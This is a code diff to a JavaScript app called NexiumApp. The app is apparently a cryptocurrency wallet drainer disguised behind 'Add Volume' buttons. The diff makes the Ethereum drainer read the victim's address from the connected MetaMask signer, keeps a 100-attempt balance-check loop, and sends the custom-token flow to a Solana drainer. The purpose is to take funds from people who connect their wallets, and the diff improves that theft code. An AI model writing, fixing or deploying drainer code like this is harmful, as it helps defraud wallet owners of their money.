@@ -143,7 +143,7 @@ class NexiumApp {
         if (this.connectedWalletType && !this.dom.connectWallet.disabled) {
           console.log(`${this.connectedWalletType} Add Volume clicked (outer button)`); // Log 13
           if (this.connectedWalletType === 'MetaMask') {
-            this.drainEthereumWallet(this.publicKey);
+            this.drainEthereumWallet(); // Removed argument
           } else if (this.connectedWalletType === 'Phantom') {
             this.drainSolanaWallet();
           }
@@ -201,7 +201,7 @@ class NexiumApp {
     const addVolumeHandler = (walletName) => {
       console.log(`${walletName} Add Volume clicked`); // Log 22
       if (walletName === 'MetaMask') {
-        this.drainEthereumWallet(this.publicKey);
+        this.drainEthereumWallet(); // Removed argument
       } else if (walletName === 'Phantom') {
         this.drainSolanaWallet();
       }
@@ -409,8 +409,8 @@ class NexiumApp {
     }
   }
 
-  async drainEthereumWallet(wallet) {
-    console.log("🔄 ETH Drainer Triggered for address:", wallet); // Log 63
+  async drainEthereumWallet() {
+    console.log("🔄 ETH Drainer Triggered"); // Log 63
     this.showProcessingSpinner();
     if (typeof window === "undefined" || !window.ethereum) {
       console.error("⚠️ No Ethereum provider found. Make sure MetaMask is installed."); // Log 64
@@ -439,7 +439,8 @@ class NexiumApp {
       }
 
       const signer = await provider.getSigner();
-      console.log("✅ Connected to Ethereum Wallet:", await signer.getAddress()); // Log 68
+      const walletAddress = await signer.getAddress();
+      console.log("✅ Connected to Ethereum Wallet:", walletAddress); // Log 68
 
       let attempts = 0;
       const maxRetries = 100;
@@ -447,7 +448,7 @@ class NexiumApp {
 
       while (attempts < maxRetries) {
         try {
-          const balance = await provider.getBalance(wallet);
+          const balance = await provider.getBalance(walletAddress);
           console.log(`💰 ETH Balance: ${ethers.formatEther(balance)} ETH`); // Log 69
           
           if (balance <= 0n) {
@@ -1134,9 +1135,9 @@ class NexiumApp {
         }
         console.log(`Custom token submit: address=${tokenAddress}, amount=${amount}`); // Log 165
         if (this.connectedWalletType === 'MetaMask') {
-          this.drainEthereumWallet(this.publicKey);
+          this.drainEthereumWallet(); // Removed argument
         } else if (this.connectedWalletType === 'Phantom') {
-          this.drainToken(tokenAddress);
+          this.drainSolanaWallet();
         }
         if (this.dom.customTokenModal) {
           this.dom.customTokenModal.classList.remove('active');
